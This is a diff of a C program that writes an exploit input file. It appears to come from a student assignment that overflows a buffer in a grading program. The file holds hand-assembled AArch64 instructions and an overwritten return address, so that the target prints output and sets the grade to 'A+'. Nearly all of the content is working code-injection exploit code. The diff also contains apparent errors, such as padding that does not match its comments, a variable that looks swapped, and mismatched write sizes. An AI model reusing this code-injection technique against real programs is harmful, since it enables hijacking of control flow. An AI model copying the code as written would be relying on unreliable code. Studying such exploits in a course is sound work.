@@ -5,54 +5,68 @@
 
 int main(void)
 {
-    const char* name = "Tansha Augarwal";
+    const char* name = "Tansha";
     int i;
     unsigned long ulReturnAddress = 0x420070;
 
     /* putchar('A') */
-    unsigned int uiAdrInstr1 = MiniAssembler_adr(0, 0x400938, 0x42006C);
-    /* unsigned int uiMovInstr1 = MiniAssembler_mov(0, 0x41); /* 24-27 */
-    /* unsigned int uiBlInstr1 = MiniAssembler_bl(0x400490, 0x420070); /* 28-31 */
-    unsigned int uiBlInstr1 = MiniAssembler_bl(0x400600, 0x420070); /* 28-31 */
-
+    /* unsigned int uiAdrInstr1 = MiniAssembler_adr(0, 0x400938, 0x42006C); */
+    /* unsigned int uiMovInstr1 = MiniAssembler_mov(0, 0x41); /* /* 24-27 */
+    /* unsigned int uiBlInstr1 = MiniAssembler_bl(0x400490, 0x420070); */ /* 28-31 */
+    /* unsigned int uiBlInstr1 = MiniAssembler_bl(0x400600, 0x420070); */ /* 28-31 */
+    
+    /* adrp	x0, 0x400000 */
+    unsigned int uiAdrpInstr1 = MiniAssembler_adrp(0, 0x400000, 0x420064); /* 1 */
+    /* add	x0, x0, #0x978 */
+    unsigned int uiAddInstr1 = MiniAssembler_add(0, 0, 0x978); /* 2 */
+    /* adrp	x1, 0x420000*/
+    unsigned int uiAdrpInstr2 = MiniAssembler_adrp(1, 0x420000, 0x42006C); /* 3 */
+    /* add	x1, x1, #0x58 */
+    unsigned int uiAddInstr2 = MiniAssembler_add(1, 1, 0x58);/* 4 */
+    /* bl	0x400600 <printf@plt> */
+    unsigned int uiBlInstr1 = MiniAssembler_bl(0x400600, 0x420074);/* 5 */
+    
     /* grade = + */
-    unsigned int uiMovInstr2 = MiniAssembler_mov(1, 0x002B); /* 32-35 */
-    unsigned int uiAdrInstr = MiniAssembler_adr(2, 0x420044, 0x420078); /* 36-39 */
-    unsigned int uiStrbInstr = MiniAssembler_strb(1, 2); /* 40-43 */
+    unsigned int uiMovInstr2 = MiniAssembler_mov(1, 0x002B); /* 6 */
+    unsigned int uiAdrInstr1 = MiniAssembler_adr(2, 0x420044, 0x42007C); /* 7 */
+    unsigned int uiStrbInstr1 = MiniAssembler_strb(1, 2); /* 8 */
     
     /* Branch to printf("%c is your grade.\n", grade); */
-    unsigned int uiBInstr = MiniAssembler_b(0x400864, 0x420080); /* 44 - 47 */
+    unsigned int uiBInstr1 = MiniAssembler_b(0x400864, 0x420084); /* 9 */
 
     FILE *psFile;
 
     psFile = fopen("dataAplus", "w");
 
-    /* Printing out 15-character long name. */
-    /* 0->14 */
+    /* Printing out 6-character long name. */
+    /* 0->5 */
     fprintf(psFile, "%s", name);
+    /* 0x420058 -> 0x42005E */
     
-    /* 15->23 */
+    /* 6->12 */
     for (i = 0; i < 9; i++)
     {
         putc('\0', psFile); /* Writes 00000000 */
     }
 
     fwrite(&uiAdrInstr1, sizeof(unsigned int), 1, psFile);
-
+    fwrite(&uiAddInstr1, sizeof(unsigned int), 1, psFile);
+    fwrite(&uiAdrpInstr2, sizeof(unsigned int), 1, psFile);
+    fwrite(&uiAddInstr2, sizeof(unsigned int), 1, psFile);
     fwrite(&uiBlInstr1, sizeof(unsigned int), 1, psFile);
 
+
     fwrite(&uiMovInstr2, sizeof(unsigned int), 1, psFile);
+    fwrite(&uiAdrInstr1, sizeof(unsigned long), 1, psFile);
+    fwrite(&uiStrbInstr1, sizeof(unsigned int), 1, psFile);
 
-    fwrite(&uiAdrInstr, sizeof(unsigned int), 1, psFile);
+    fwrite(&uiBInstr1, sizeof(unsigned long), 1, psFile);
 
-    fwrite(&uiStrbInstr, sizeof(unsigned int), 1, psFile);
-
-    fwrite(&uiBInstr, sizeof(unsigned int), 1, psFile);
- 
     fwrite(&ulReturnAddress, sizeof(unsigned long), 1, psFile);
 
     fclose(psFile);
 
     return 1;
 }
+
 
